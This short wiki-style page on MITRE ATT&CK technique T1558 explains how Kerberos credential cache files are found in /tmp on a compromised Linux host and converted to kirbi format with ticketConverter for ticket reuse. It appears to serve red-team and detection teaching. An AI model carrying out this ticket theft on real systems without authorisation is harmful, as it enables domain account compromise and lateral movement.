---
description: MITRE ATT&CK, Credential Access, Technique T1558
---

# Steal Kerberos Tickets

### Stealing Kerberos Tickets on Linux

Kerberos Credential Cache (ccache) files contain Kerberos credentials for the domain user that has authenticated to the Linux machine, this is often a cached TGT. These are referred to as a Linux Cached Credential and are stored in `/tmp` and can be exfiltrated by an attacker to request service tickets.

#### Example

```bash
# Upon compromising a Linux system we identify a ccache file in /tmp
ls /tmp

-rw------- 1 parzival  domain users 1342 May  18 14:39 krb5cc_1337_TejHnF

# We can then download this ticket to our local machine and convert the ticket from ccache to kirbi
python3 ticketConverter krb5cc_1337_TejHnF parzival.kirbi
```
